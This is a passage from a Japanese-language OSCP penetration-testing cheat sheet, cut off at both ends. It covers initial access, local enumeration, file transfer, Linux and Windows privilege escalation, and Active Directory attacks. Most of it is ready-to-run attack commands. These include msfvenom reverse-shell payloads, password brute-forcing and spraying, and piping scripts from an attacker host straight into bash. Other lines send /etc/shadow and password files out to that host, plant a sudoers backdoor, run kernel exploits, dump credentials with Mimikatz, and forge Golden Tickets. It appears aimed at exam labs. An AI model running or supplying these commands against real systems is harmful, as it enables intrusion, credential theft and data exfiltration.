msfvenom -p java/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f war -o shell.war

# Python Script Payload
msfvenom -p python/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f raw -o shell.py

# C言語形式シェルコード (バッドチャラ除外: \x00\x0a\x0d)
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -b "\x00\x0a\x0d" -f c
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -b "\x00\x0a\x0d" -f c

# C# 形式シェルコード (.NET / PowerShell 開発用)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f csharp

# エンコーダー適用 (shikata_ga_nai 5回反復)
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

---

### 2.6 パスワード攻撃・ブルートフォース (Hydra & Netexec)

```bash
# Hydra: SSHに対する単一ユーザー/辞書攻撃
hydra -l admin -P $WORDLIST ssh://$TARGET_IP -t 4
hydra -L users.txt -P $WORDLIST ssh://$TARGET_IP -t 4

# Hydra: FTP に対するブルートフォース
hydra -l anonymous -P $WORDLIST ftp://$TARGET_IP

# Hydra: HTTP POST ログインフォーム攻撃
hydra -l admin -P $WORDLIST $TARGET_IP http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"

# Hydra: RDP に対するブルートフォース
hydra -L users.txt -p 'Password123!' rdp://$TARGET_IP -t 1

# Netexec: SMBパスワードスプレー（ロックアウト防止対策）
nxc smb $TARGET_IP -u users.txt -p 'Winter2024!' --continue-on-success
nxc smb $TARGET_IP -u 'administrator' -P $WORDLIST

# Netexec: WinRM パスワードスプレー
nxc winrm $TARGET_IP -u users.txt -p passwords.txt --continue-on-success

# Medusa: 高速プロトコルパスワードスプレッダー
medusa -h $TARGET_IP -u admin -P $WORDLIST -M ssh
```

---

### 🛠 【2.5 初期侵入フェーズのトラブルシューティング・チェックリスト】

- [ ] **リバースシェルが着信しない場合、LHOST と LPORT は正しいか？**  
  `ip a` で Kali の tun0 (VPN) の IP アドレスを指定しているか確認してください。eth0 の IP を誤って指定していないか？ ポート番号を 443 や 80 に変更してみたか？（送信元FWブロック回避）
- [ ] **ファイアウォールで送信ポートがブロックされていないか？**  
  ポート `4444` が弾かれる場合は、一般的な送出許可ポートである `80`, `443`, `53`, `445` を LPORT に指定して試してください。
- [ ] **Webシェルをアップロードしたが実行（500/404エラー）されないか？**  
  ファイル形式が正しいか（`shell.php` か `shell.aspx` か `shell.jsp` か）、アップロード先のフォルダに実行権限（Exec）があるか確認してください。
- [ ] **パスワードスプレーで全員失敗する場合、ドメイン指定やユーザー名のフォーマットは正しいか？**  
  `username` 単体、`DOMAIN\username`、`username@domain.local` の全パターンを試しましたか？
- [ ] **コマンドインジェクションでスペースが弾かれるか？**  
  `${IFS}` や `{cat,/etc/passwd}` や Base64 エンコードしたコマンド (`echo <b64> | base64 -d | sh`) を試しましたか？
- [ ] **Webフォームの入力値に対して手動で `' OR '1'='1` や `1; id` をテストしたか？**

---

## 3. ローカル詳細調査 (Local Enumeration)

---

### 3.1 Linux ローカル詳細調査

```bash
# OS / カーネル / アーキテクチャの確認
uname -a; cat /etc/os-release; cat /etc/issue

# 現在のユーザー権限とSudo実行可能コマンドの確認
id; sudo -l

# 全環境変数の確認
env; printenv

# ユーザー一覧・グループ一覧の確認
cat /etc/passwd | grep -v 'nologin\|false'
cat /etc/group

# SUID / SGID ファイルの全検索
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null

# Capabilities (ケーパビリティ) の設定確認
getcap -r / 2>/dev/null

# Cronジョブおよびタイマーの確認
crontab -l; cat /etc/crontab; ls -la /etc/cron.*; cat /etc/systemd/system/*.timer
ls -la /var/spool/cron/crontabs/

# 内部リッスンポートおよびアクティブなネットワーク接続
netstat -tuln; ss -tulpn
arp -a; route -n

# 実行中プロセス一覧の確認
ps aux | grep root
ps -ef

# pspy: リアルタイムプロセス監視 (Sudo不要でCron動作等をキャプチャ)
./pspy64 -pf -i 1000

# 書き込み可能なディレクトリの確認
find / -writable -type d 2>/dev/null | grep -v "/proc\|/sys\|/dev"

# 設定ファイル・パスワード・キーの検索
grep -rnw '/var/www/html/' -e 'password' -e 'PASS' 2>/dev/null
find / -name "*.config" -o -name "*.conf" -o -name "*.json" 2>/dev/null | grep -v "/usr\|/var/lib"
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null

# ログファイルの検索
ls -la /var/log/

# 自動化スクリプトの転送・実行 (linPEAS / LinEnum / LSE)
curl -sL http://$ATTACKER_IP/linpeas.sh | bash
./LinEnum.sh -k password -r report -e -t
./lse.sh -l1
```

---

### 3.2 Windows ローカル詳細調査

```cmd
:: ユーザー権限と特権 (Privileges) の確認
whoami /priv
whoami /groups
whoami /all

:: OS・システム情報とビルド番号の特定
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(es)"

:: ネットワーク接続とリッスンポート・ARPテーブルの確認
netstat -ano
arp -a
route print

:: ユーザーアカウントおよびローカルグループ一覧
net user
net localgroup
net localgroup Administrators

:: 稼働中サービスおよびアンチウイルスの状況
tasklist /SVC
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /v /i "C:\Windows"

:: 未引用サービスパス (Unquoted Service Paths) の確認
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: 保存済み資格情報の確認 (cmdkey)
cmdkey /list

:: レジストリ・設定ファイル内のパスワード検索
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul

:: 自動ログイン情報のレジストリ検索
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

:: AlwaysInstallElevated の確認
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: SAM / SYSTEM バックアップファイルの存在確認
dir C:\Windows\System32\config\RegBack\
dir C:\System Volume Information\

:: PowerShell 履歴ファイルの確認
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

:: 自動化スクリプトの実行 (winPEAS / Seatbelt / PowerUp)
powershell -ep bypass -c "iwr -uri http://$ATTACKER_IP/winPEASx64.exe -OutFile winPEAS.exe"; .\winPEAS.exe
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
.\Seatbelt.exe -group=system
```

---

### 3.3 ファイル転送テクニック (Linux & Windows 双方向)

```bash
# --------------------------------------------------
# 攻撃機 (Kali) 側での受信用・提供用サーバー立ち上げ
# --------------------------------------------------
# Python HTTP サーバー (ファイル提供用)
python3 -m http.server 80

# Impacket SMB サーバー (Windowsからのファイル転送・実行用)
impacket-smbserver share $(pwd) -smb2support

# FTP サーバー (pyftpdlib)
python3 -m pyftpdlib -p 21 -w

# Netcat ファイル受信用リスナー
nc -lvnp 4444 > received_file.bin

# --------------------------------------------------
# ターゲット (Linux) でのダウンロード・アップロード
# --------------------------------------------------
wget http://$ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh
curl -o /tmp/linpeas.sh http://$ATTACKER_IP/linpeas.sh

# Linux から攻撃機へファイルを送る (Netcat)
nc $ATTACKER_IP 4444 < /etc/shadow
cat /etc/shadow > /dev/tcp/$ATTACKER_IP/4444

# --------------------------------------------------
# ターゲット (Windows) でのダウンロード・アップロード
# --------------------------------------------------
# Certutil
certutil.exe -urlcache -split -f "http://$ATTACKER_IP/winPEAS.exe" C:\Windows\Tasks\winPEAS.exe

# PowerShell Invoke-WebRequest
powershell -c "iwr -uri http://$ATTACKER_IP/winPEAS.exe -OutFile C:\Windows\Tasks\winPEAS.exe"
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER_IP/winPEAS.exe', 'C:\Windows\Tasks\winPEAS.exe')"

# PowerShell で攻撃機へファイル転送 (POST)
powershell -c "$b=Get-Content -Encoding Byte -Path 'C:\passwords.txt';Invoke-RestMethod -Uri http://$ATTACKER_IP/upload -Method Post -Body $b"

# SMB サーバーからの直接実行 (ローカルに保存せず直接実行)
\\$ATTACKER_IP\share\winPEAS.exe
copy \\$ATTACKER_IP\share\nc.exe C:\Windows\Tasks\nc.exe
```

---

### 🛠 【3.4 ローカル詳細調査フェーズのトラブルシューティング・チェックリスト】

- [ ] **`sudo -l` でパスワードを求められて実行できないか？**  
  `sudo -l` が動かない場合は、SUID検索、Capabilities (`getcap`)、Cronジョブの確認に切り替えてください。
- [ ] **`linPEAS` / `winPEAS` の出力が多すぎて大事な項目を見落としていないか？**  
  PEASの出力中、**RED/YELLOW（赤地に黄文字）** でハイライトされている部分を最優先で確認してください。
- [ ] **Windowsで PowerShell 実行ポリシー (Execution Policy) でスクリプトがブロックされるか？**  
  `powershell -ep bypass -file script.ps1` または `powershell -ExecutionPolicy Unrestricted` を使用して回避してください。
- [ ] **内部でのみリッスンしているポート (127.0.0.1:8080 など) を見落としていないか？**  
  `netstat -tuln` (Linux) や `netstat -ano` (Windows) で外部公開されていないローカル専用ポートがないか確認し、ピボット/ポート転送を検討してください。
- [ ] **ファイル転送で Certutil がウイルス対策 (AV) に引っかかるか？**  
  `certutil.exe` がブロックされた場合は、PowerShell `Invoke-WebRequest` や `WebClient` や SMB 共有 (`\\$ATTACKER_IP\share`) を使用してください。
- [ ] **Linux: `/opt`, `/tmp`, `/var/backups`, `/home/*` 内にアクセス可能なバックアップファイルがないか？**
- [ ] **Windows: PowerShell の履歴ファイル（`ConsoleHost_history.txt`）をチェックしたか？**
- [ ] **Windows: `Unattend.xml` や `sysprep.xml` などの無人インストールファイルが残っていないか？**

---

## 4. 権限昇格 (Privilege Escalation)

---

### 4.1 Linux 権限昇格テクニック

```bash
# 1. Sudo 悪用 (GTFOBins 活用例)
# find
sudo find . -exec /bin/sh \; -quit
# vim
sudo vim -c ':!/bin/sh'
# env
sudo env /bin/sh
# awk
sudo awk 'BEGIN {system("/bin/sh")}'
# python
sudo python3 -c 'import os; os.system("/bin/bash")'
# perl
sudo perl -e 'exec "/bin/sh";'
# less / more / man
sudo less /etc/profile  # 表示中に !/bin/sh を入力
# nmap (古いバージョン)
sudo nmap --interactive  # nmap> !sh
# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# 2. SUID 悪用 (/usr/bin/env, /usr/bin/find, /usr/bin/pkexec)
/usr/bin/env /bin/sh -p
/usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Pkexec (CVE-2021-4034 PwnKit)
./PwnKit

# 3. PATH 環境変数の悪用 (Sudo/SUIDバイナリが相対パスで外部コマンドを呼ぶ場合)
# 例: バイナリが内部で 'service' や 'ls' や 'curl' を呼び出している場合
cd /tmp
echo "/bin/bash -p" > ls
chmod +x ls
export PATH=/tmp:$PATH

# 4. Wildcard (*) インジェクション (tarなどのCronジョブ悪用)
# Cron設定: */1 * * * * root cd /var/www/html && tar -czf /tmp/backup.tar.gz *
echo 'echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /tmp/run.sh
chmod +x /tmp/run.sh
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=sh\ /tmp/run.sh

# 5. Capabilities (cap_setuid) 悪用
# 設定例: /usr/bin/python3.8 = cap_setuid+ep
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# 設定例: /usr/bin/perl = cap_setuid+ep
/usr/bin/perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'

# 6. Shared Object (.so) ライブラリハイジャック (LD_PRELOAD)
# sudo -l で env_keep+=LD_PRELOAD が有効な場合
# 攻撃コード compile (shell.c):
# #include <stdio.h>
# #include <sys/types.h>
# #include <unistd.h>
# void _init() {
#     unsetenv("LD_PRELOAD");
#     setgid(0); setuid(0);
#     system("/bin/bash");
# }
# コンパイル: gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
# 実行: sudo LD_PRELOAD=/tmp/shell.so <ALLOWED_COMMAND>

# 7. Kernel Exploits
# Dirty COW (CVE-2016-5195)
gcc -pthread dirty.c -o dirty -lcrypt; ./dirty password
# Dirty Pipe (CVE-2022-0847)
./dirtypipe /etc/passwd 1 ":0:0:root:/root:/bin/bash"
```

---

### 4.2 Windows 権限昇格テクニック

```cmd
:: 1. Service Abuse (不適切なアクセス権限を持つサービスのバイナリパス書き換え)
:: サービスパーミッションの確認 (accesschk.exe)
accesschk.exe -uwcqv "Everyone" * /acceptEula
accesschk.exe -uwcqv "Authenticated Users" * /acceptEula

:: サービスのバイナリパス変更と再起動
sc config "VulnerableService" binPath= "C:\Windows\Tasks\reverse.exe"
sc stop "VulnerableService"
sc start "VulnerableService"

:: 2. Service Binary Hijacking (バイナリ自体の置き換え)
:: サービス停止 -> 元のEXEをバックアップ -> リバースシェルEXEを上書き配置 -> サービス開始
copy C:\Windows\Tasks\reverse.exe "C:\Program Files\MyService\service.exe" /y
net stop MyService
net start MyService

:: 3. Unquoted Service Path (引用符なしスペース入りサービスパス)
:: サービスパス例: C:\Program Files\My Apps\Service.exe
:: 攻撃バイナリ配置: C:\Program Files\My.exe
copy C:\Windows\Tasks\reverse.exe "C:\Program Files\My.exe"
sc start MyService

:: 4. Token Impersonation (SeImpersonatePrivilege / SeAssignPrimaryToken)
:: PrintSpoofer による昇格 (Windows 10 / Server 2016/2019)
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -c "C:\Windows\Tasks\reverse.exe"

:: RoguePotato / SweetPotato (Windows Server 2019/2022)
RoguePotato.exe -r 10.10.14.5 -e "C:\Windows\Tasks\reverse.exe" -l 9999

:: GodPotato (Windows Server 2012/2016/2019/2022, Windows 10/11)
GodPotato.exe -cmd "C:\Windows\Tasks\reverse.exe"

:: 5. AlwaysInstallElevated (レジストリ設定ミス)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: 両方0x1の場合、MSIバイナリを生成してSYSTEM権限で実行
msiexec /quiet /qn /i http://$ATTACKER_IP/payload.msi

:: 6. DLL Hijacking
:: 欠落しているDLL (Missing DLL) をProcmonで確認 -> 攻撃DLLを作成してアプリと同じ階層へ配置

:: 7. SAM / SYSTEM レジストリ抽出によるローカル管理者ハッシュ特定
reg save HKLM\SAM SAM.hiv
reg save HKLM\SYSTEM SYSTEM.hiv
:: 攻撃機で解読: impacket-secretsdump -sam SAM.hiv -system SYSTEM.hiv LOCAL
```

---

### 🛠 【4.3 権限昇格フェーズのトラブルシューティング・チェックリスト】

- [ ] **GTFOBins / SUID でシェルを取ったのに `id` が一般ユーザーのままか？**  
  Bash などのシェルは特権を削除して起動する場合があります。`-p` フラグ (`/bin/bash -p`) を付けて実効ユーザー権限 (eUID) を維持してください。
- [ ] **Windows で `SeImpersonatePrivilege` があるのに PrintSpoofer が失敗するか？**  
  OSバージョンを確認してください。Windows Server 2019以降や最新のPatch適用環境では `RoguePotato` や `GodPotato` を使用してください。
- [ ] **サービスの設定変更 (`sc config`) が Access Denied になるか？**  
  サービス設定変更権限が無くても、サービスバイナリ自体に書き込み権限 (`accesschk.exe -ucwv "C:\Program Files\..."`) やフォルダ書き込み権限がないか確認してください。
- [ ] **Cronジョブが実行されているのにスクリプトが動かないか？**  
  環境変数 `$PATH` がCron内で極めて限定されている場合があります。スクリプト内で `curl` や `bash` などのコマンドは絶対パス (`/bin/bash`, `/usr/bin/curl`) で記述してください。
- [ ] **Kernel Exploit を試す前に他の基本構成ミスをすべてチェックしたか？**  
  カーネルエクスプロイトはシステムをクラッシュさせる危険（OSCP試験での減点・リセット）があるため、必ず最終手段として選択してください。
- [ ] **Linux: `sudo -l` で発見したコマンドを GTFOBins (gtfobins.github.io) で検索したか？**
- [ ] **Linux: `ls -la /etc/passwd` や `/etc/shadow` に書き込み権限がないか確認したか？**
- [ ] **Windows: `whoami /priv` で `SeImpersonatePrivilege` が有効なら `PrintSpoofer` や `RoguePotato` を試したか？**
- [ ] **Windows: 稼働中サービスのファイルパーミッション（`icacls`）で `Modifiable Services` がないか確認したか？**
- [ ] **取得した一般ユーザーのパスワードで root / Administrator へのログイン（`su -` や `runas`）を試したか？**

---

## 5. Active Directory (AD) 攻略 [OSCP最重要]

> [!TIP]
> ドメイン資格情報がない最初期段階では、SMB (445) や LDAP (389) の匿名・Guestアクセスを最優先で調査します。

```bash
# Netexec: SMB 共有・ゲスト/Nullセッション探索
nxc smb $DC_IP -u '' -p '' --shares
nxc smb $DC_IP -u 'guest' -p '' --shares

# Netexec: 匿名アクセスでドメインユーザー一覧・パスワードポリシーを抽出
nxc smb $DC_IP -u '' -p '' --users --pass-pol

# rpcclient: Null SessionでのドメインSID・ユーザー・グループ・記述欄一括抽出
rpcclient -U "" -N $DC_IP -c "lsaquery; enumdomusers; querydispinfo; enumdomgroups"

# enum4linux-ng: 包括的SMB/RPC詳細自動列挙
enum4linux-ng -A $DC_IP

# ldapsearch: 匿名バインドによるNaming Contexts (Base DN) 取得
ldapsearch -H ldap://$DC_IP -x -s base namingContexts

# ldapsearch: 匿名バインドで全ユーザーの sAMAccountName と description (説明欄) を抽出
ldapsearch -H ldap://$DC_IP -x -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description
```

---

### 5.1 AD 列挙 (Enumeration & Reconnaissance)

```powershell
# PowerView (PowerShell) による基本列挙
Import-Module .\PowerView.ps1

# ドメイン基本情報・ドメインコントローラーの特定
Get-Domain
Get-DomainController

# ドメインユーザーの列挙
Get-DomainUser -Identity "administrator"
Get-DomainUser | select samaccountname, description, useraccountcontrol

# 特殊な設定を持つアカウントの探索
Get-DomainUser -PreauthNotRequired                      # AS-REP Roasting対象の特定
Get-DomainUser -SPN                                     # Kerberoasting対象の特定
Get-DomainUser -AdminCount                              # 過去・現在の保護対象アカウント

# グループおよびメンバーシップの特定
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainLocalGroupMember -Identity "Administrators"

# コンピュータアカウントおよびOS情報の特定
Get-DomainComputer -Properties name,operatingsystem,dnshostname

# GPO (グループポリシー) および 組織単位 (OU) の特定
Get-DomainGPO
Get-DomainOU

# ドメイン間信頼関係 (Trusts) の確認
Get-DomainTrust

# ACL / ACL 権限アクセスの検出 (WriteDacl, GenericAll, GenericWrite)
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
```

```bash
# SharpHound / BloodHound データ収集
# ターゲットマシン (Windows) での収集:
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Linux攻撃機からの Remote BloodHound Python スキャン:
bloodhound-python -u 'username' -p 'password' -d $DOMAIN -dc $DC_HOSTNAME.$DOMAIN -c All --zip

# BloodHound GUI での主要検索クエリ:
# - Find Shortest Paths to Domain Admins
# - Find All Paths to Domain Admins
# - Find Shortest Paths to High Value Targets
# - Find Kerberoastable Users
# - Find AS-REP Roastable Users
# - Find AS-REP Roastable ACLs (GenericAll/WriteDacl)]


# Netexec (旧 CrackMapExec) による一括列挙
# 有効資格情報を用いた全ユーザー一覧の取得
nxc ldap $DC_IP -u $USER -p $PASS --users

# パスワードポリシー (ロックアウト閾値・最小文字数) の確認
nxc smb $DC_IP -u $USER -p $PASS --pass-pol

# アクティブなドメインセッション (Logged-on Users) の探索
nxc smb $TARGET_IP -u $USER -p $PASS --loggedon-users

# 共有フォルダのアクセス権限を一括確認 (WRITE権限のある共有の特定)
nxc smb 10.10.10.0/24 -u $USER -p $PASS --shares
```
---

### 5.2 AD 認証攻撃 & チケット攻撃

#### AS-REP Roasting (事前認証不要アカウント)

> [!NOTE]
> `DONT_REQ_PREAUTH` (Kerberos事前認証不要) フラグが設定されたユーザーアカウントに対し、暗号化されたTGT要求応答を取得してオフライン解析します。

```bash
# Impacket: 資格情報なしでの事前認証不要アカウント探索とハッシュ取得
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip $DC_IP

# Impacket: ドメイン資格情報を使用した探索
impacket-GetNPUsers $DOMAIN/username:password -request -format hashcat -outputfile asrep.hashes -dc-ip $DC_IP

# Rubeus (Windows上での実行)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes

# Hashcat: 取得したAS-REPハッシュのオフライン解読 (モード: 18200)
hashcat -m 18200 -a 0 asrep.hashes $WORDLIST -r /usr/share/hashcat/rules/best64.rule
```

#### Kerberoasting (SPNアカウント)

> [!IMPORTANT]
> サービスプリンシパル名 (SPN) が登録されたアカウントに対し、TGS (Ticket Granting Service) チケットを要求し、その暗号化部分をオフラインでパスワード解析します。

```bash
# Impacket: 取得済みドメイン資格情報を使用したSPNチケット要求とハッシュ取得
impacket-GetUserSPNs $DOMAIN/username:password -dc-ip $DC_IP -request -outputfile kerberoast.hashes

# Impacket: 特定SPNに絞って要求
impacket-GetUserSPNs $DOMAIN/username:password -dc-ip $DC_IP -request-user mssql_svc -outputfile kerberoast.hashes

# Rubeus (Windows上での実行)
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.hashes

# Hashcat: Kerberoastハッシュのオフライン解読 (モード: 13100)
hashcat -m 13100 -a 0 kerberoast.hashes $WORDLIST -r /usr/share/hashcat/rules/rockyou-30000.rule
```

#### Pass-the-Hash (PtH) & Pass-the-Ticket (PtT) / Overpass-the-Hash
```bash
# Pass-the-Hash (PtH) - Impacket wmiexec
impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@$TARGET_IP
impacket-wmiexec -hashes 329f539fb6973b711e011e7628b613ce:7a38310ea6f0027ee955abed1762964b $DOMAIN/Administrator@$TARGET_IP

# Pass-the-Hash (PtH) - Impacket psexec / smbexec / atexec
impacket-psexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@$TARGET_IP
impacket-smbexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@$TARGET_IP
impacket-atexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@$TARGET_IP 'whoami'

# Evil-WinRM (WinRMサービス 5985/5986 経由)
evil-winrm -i $TARGET_IP -u Administrator -H 7a38310ea6f0027ee955abed1762964b
evil-winrm -i $TARGET_IP -u username -p 'Password123!'

# Overpass-the-Hash (NTLMハッシュからKerberos TGTを取得)
impacket-getTGT $DOMAIN/username -hashes :7a38310ea6f0027ee955abed1762964b
export KRB5CCNAME=username.ccache
impacket-wmiexec -k -no-pass $DOMAIN/username@$DC_HOSTNAME.$DOMAIN

# Rubeus (Windows上での Overpass-the-Hash & Pass-the-Ticket)
.\Rubeus.exe asktgt /user:username /domain:$DOMAIN /ntlm:7a38310ea6f0027ee955abed1762964b /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

#### パスワードスプレー & ユーザー名ブルートフォース (Password Spraying)

> [!WARNING]
> アカウントのロックアウト設定 (`--pass-pol` で確認) を必ず事前に把握し、ロック閾値未満の回数で試行します。

```bash
# Kerbrute: Kerberosを利用した高速かつノイズの少ないユーザー名有効確認 (未認証)
kerbrute userenum -d $DOMAIN --dc $DC_IP /usr/share/seclists/Usernames/xato-net-10-000-usernames.txt

# Kerbrute: 判明したユーザーリストに対する単一パスワードスプレー
kerbrute passwordspray -d $DOMAIN --dc $DC_IP users.txt 'Welcome2024!'

# Netexec: SMBパスワードスプレー (成功後も他アカウント試行を継続)
nxc smb $DC_IP -u users.txt -p 'Spring2024!' --continue-on-success

# Netexec: ユーザー名 = パスワード の使い回しアカウント探索
nxc smb $DC_IP -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

---

### 5.3. ドメイン内権限昇格 & AD特権悪用 (AD Privilege Escalation)

#### GPP (Group Policy Preferences) パスワード取得

```bash
# SYSVOL共有内の groups.xml / Services.xml から cpassword 属性を検索
smbclient \\$DC_IP\SYSVOL -U "$DOMAIN\$USER%$PASS" -c "recurse; prompt; cd $DOMAIN/Policies; mget *.xml"

# gpp-decrypt: 既知のAES鍵で cpassword 文字列を暗号解除
gpp-decrypt "j1A5ZacSp3B5/3rNldClS2MDmgpL5WnpFCDAQ8subB7AH"

# Netexec: GPP パスワードを全自動自動探索・複合
nxc smb $DC_IP -u $USER -p $PASS -M gpp_password
```

#### ADCS (Active Directory Certificate Services) 攻撃

##### Certify (Windows) / Certipy (Linux)
```bash
# Certipy: ADCS の脆弱な証明書テンプレート (ESC1, ESC2, ESC3, ESC4, ESC8 等) の列挙
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -vulnerable

# Certipy: ESC1 悪用 - Domain Admin になりすました証明書 (PFX) の要求
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -ca CORP-DC01-CA -template VulnerableTemplate -upn administrator@$DOMAIN -out admin.pfx

# Certipy: PFX 証明書から NT ハッシュを取得 (PKINIT)
certipy auth -pfx admin.pfx -dc-ip $DC_IP
```

#### Kerberos 委任攻撃 (Delegation Attacks)

##### Unconstrained Delegation (非制約委任)
```powershell
# PowerView: 非制約委任が有効なコンピュータの探索
Get-DomainComputer -Unconstrained

# Rubeus: TGT チケットの監視・抽出 (DCへのPRINTSPOOLER悪用等と組み合わせ)
.\Rubeus.exe monitor /interval:5 /targetuser:DC01$
```

##### Constrained Delegation (制約委任 - S4U2self / S4U2proxy)
```bash
# Impacket: 制約委任権限を持つアカウントのパスワード/ハッシュから管理者TGSを取得
impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator -hashes :$HASH $DOMAIN/svc_web
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass dc01.corp.local
```

##### Resource-Based Constrained Delegation (RBCD)
```bash
# Impacket: ターゲットコンピュータの msDS-AllowedToActOnBehalfOfOtherIdentity 属性を書き換えて昇格
impacket-rbcd -delegate-to TARGET_COMPUTER$ -delegate-from ATTACKER_COMPUTER$ -dc-ip $DC_IP -action write $DOMAIN/$USER:$PASS
```

### 5.4 認証情報奪取 & ドメイン制御 (Credential Access & Control)

#### Mimikatz / Kiwi コマンド完全集
```cmd
:: Mimikatz 起動とデバッグ権限の有効化
privilege::debug

:: LSASS メモリからの全ログインパスワード・ハッシュ・チケット奪取
sekurlsa::logonpasswords
sekurlsa::tickets /export
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:7a38310ea6f0027ee955abed1762964b

:: SAM データベースからのローカルハッシュ取得
lsadump::sam

:: LSA シークレットの取得
lsadump::lsa /patch

:: DCSync 攻撃 (Mimikatz 上で特定アカウントのハッシュを取得)
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /user:krbtgt
```

#### Golden Ticket / Silver Ticket 偽造 (Impacket & Mimikatz)
```bash
# Impacket ticketer による Golden Ticket の生成
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$DC_HOSTNAME.$DOMAIN

# Impacket ticketer による Silver Ticket (CIFS サービス用) の生成
impacket-ticketer -nthash <TARGET_HOST_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain $DOMAIN -spn cifs/$TARGET_HOST Administrator
```

#### DCSync 攻撃 & NTDS.dit ダンプ
```bash
# Impacket: secretsdump による全ドメインアカウントハッシュの一括ダンプ
impacket-secretsdump $DOMAIN/administrator:password@$DC_IP
impacket-secretsdump -hashes :7a38310ea6f0027ee955abed1762964b $DOMAIN/administrator@$DC_IP
impacket-secretsdump -just-dc $DOMAIN/administrator@$DC_IP

# Impacket: krbtgt アカウントのハッシュのみをピンポイント取得 (Golden Ticket用)
impacket-secretsdump -just-dc-user krbtgt $DOMAIN/$USER:$PASS@$DC_IP

# Mimikatz (Windowsドメイン参加端末上)
lsadump::dcsync /domain:corp.local /user:krbtgt

# Windows DC 上での Volume Shadow Copy (VSS) による NTDS.dit 抽出
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Tasks\ntds.dit
reg save HKLM\SYSTEM C:\Windows\Tasks\SYSTEM.hiv
# 攻撃機でオフライン解析:
impacket-secretsdump -ntds ntds.dit -system SYSTEM.hiv LOCAL
```

---

### 🛠 【5.4 Active Directory 攻略フェーズのトラブルシューティング・チェックリスト】

- [ ] **AS-REP / Kerberoasting で得たハッシュが Hashcat で解析できないか？**  
  `rockyou.txt` に加えて `best64.rule` や `OneRuleToRuleThemAll` ルールを適用して再解読を試みましたか？
- [ ] **Pass-the-Hash (PtH) で `STATUS_ACCOUNT_DISABLED` または `ACCESS_DENIED` になるか？**  
